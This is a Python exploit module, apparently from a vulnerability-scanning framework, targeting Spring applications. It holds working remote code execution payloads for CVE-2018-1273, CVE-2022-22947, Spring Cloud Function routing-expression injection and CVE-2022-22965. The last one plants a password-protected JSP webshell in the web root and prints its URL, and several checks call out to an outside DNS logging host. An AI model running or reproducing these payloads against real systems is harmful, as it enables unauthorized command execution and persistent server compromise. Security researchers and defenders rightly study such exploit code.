from util.ExpRequest import ExpRequest,Output
from ClassCongregation import Ceye, Dnslog, random_name
from urllib.parse import urlparse
import util.globalvar as GlobalVar
import prettytable as pt
import random


class Spring():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
        self.domain = urlparse(self.url)
        
    def cve_2018_1273(self):
        appName = 'Spring'
        pocname = 'cve_2018_1273'
        path = ''
        path = ''
        method = 'post'
        desc = '[RCE]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        payload = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("{}")]=&password=&repeatedPassword='
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                dnslog = Ceye()
                r = exprequest.post(self.url+path, data=payload.format('ping '+dnslog.dns_host()), headers=headers)
                if dnslog.result():
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=payload.format(self.cmd), headers=headers).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
        
    def cve_2022_22947(self):
        appName = 'Spring'
        pocname = 'cve_2022_22947'
        name = random_name(6)
        paths = ['/actuator/gateway/routes/'+name,'/actuator/gateway/refresh']
        method = 'post'
        desc = '[RCE]'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/json'}
        #条件
        num1 = random.randint(100, 10000)
        num2 = random.randint(100, 10000)
        sum = num1 * num2
        #data = data = '{\n  "id": %s,\n  "filters": [{\n    "name": "AddResponseHeader",\n    "args": {\n      "name": "Result",\n      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray('%name + str(num1) + "*" + str(num2) +').getInputStream()))}"\n    }\n  }],\n  "uri": "http://example.com"\n}'
        data = data = '{\n  "id": %s,\n  "filters": [{\n    "name": "AddResponseHeader",\n    "args": {\n      "name": "Result",\n      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\"'%name + str(num1) + "*" + str(num2) +' \\").getInputStream()))}"\n    }\n  }],\n  "uri": "http://example.com"\n}'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                #添加路由
                r = exprequest.post(self.url+paths[0], data=data, headers=headers)
                #刷新路由
                r = exprequest.post(self.url+paths[1], data=data, headers=headers)
                #请求路由
                r = exprequest.get(self.url+paths[0], data=data, headers=headers)
                #删除路由
                exprequest.delete(self.url+paths[0], data=data, headers=headers)
                if str(sum) in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))
        
    def Spring_Cloud_Function(self):
        appName = 'Spring'
        pocname = 'Spring_Cloud_Function'
        path = ''
        method = 'post'
        desc = '[rce]'
        data = 'test'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                dnslog = Ceye()
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
                    'Connection': 'close', 
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*', 
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("{}")'.format('ping '+format(dnslog.dns_host())),
                }
                exprequest.post(self.url+path, data=data, headers=headers)
                if dnslog.result():
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
                #result = exprequest.post(self.url+path, data=data, headers=headers.format(self.cmd)).text
                #print(result)
        except Exception as error:
            return output.error_output(str(error))
        
    def cve_2022_22965(self):
        appName = 'Spring'
        pocname = 'cve_2022_22965'
        method = 'get'
        desc = '[rce] Spring Core, 5.2.X - 5.2.20, 5.3.X - 5.3.18'
        
        dnsverify_payload = '/?class.module.classLoader.resources.context.configFile=http://{}&class.module.classLoader.resources.context.configFile.content.aaa=xxxxx'
        dnsverify_data = 'class.module.classLoader.resources.context.configFile=http://{}&class.module.classLoader.resources.context.configFile.content.aaa=xxxxx'   
        verify_payload = '/?class.module.classLoader.resources.context.parent.pipeline.first.pattern={}&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
        attack_payload = '/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
        """
        if you don't want the JSP webshell to be large, because every request logging will be written into that file. 
        Send following request to clear the attribute
        """
        clear_payload = '/?class.module.classLoader.resources.context.parent.pipeline.first.pattern='
        shell_name = random_name(6)
        flag = random_name(6)
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'suffix': '%>'+flag, 'c1': 'Runtime', 'c2': '<%', 'DNT': '1'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                dnslog = Dnslog()
                exprequest.post(
                    url = self.url+dnsverify_payload.format(dnslog.dns_host()),
                    data = dnsverify_data.format(dnslog.dns_host()),
                    headers={"Content-Type":"application/x-www-form-urlencoded"},
                    )
                if dnslog.result():
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
                # r = exprequest.get(
                #     url=self.url+verify_payload.format(flag, shell_name),
                #     )
                # r = exprequest.get(
                #     url=self.domain.scheme+'://'+self.domain.netloc+'/%s.jsp'%shell_name,
                #     )
                # if flag in r.text:
                #     exprequest.get(
                #         url=self.url+clear_payload,
                #         )
                #     return output.echo_success(method, desc)
                # else:
                #     return output.fail()
            else:
                r = exprequest.get(
                    url=self.url+attack_payload.format(flag, shell_name),
                    headers=headers,
                    )
                exprequest.get(
                    url=self.url+clear_payload,
                    )
                print("[+]The shell address is: {}.jsp?pwd={}&cmd=whoami".format((self.url+'/'+shell_name), flag))
        except Exception as error:
            return output.error_output(str(error))
        
tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'

tb.add_row([
    "Spring",
    "cve_2018_1273",
    "[RCE]"
])

tb.add_row([
    "Spring",
    "cve_2022_22947",
    "[RCE]"
])

tb.add_row([
    'Spring',
    'Spring_Cloud_Function',
    '[rce] app="Spring Cloud" 0.0.RELEASE - 3.2.2'
])

tb.add_row([
    'Spring',
    'cve_2022_22965',
    '[rce] Spring Core, 5.2.X - 5.2.20, 5.3.X - 5.3.18'
])

print(tb)

def check(**kwargs):
    thread_list = []
    ExpSpring = Spring(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpSpring, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(Spring):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpSpring, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)


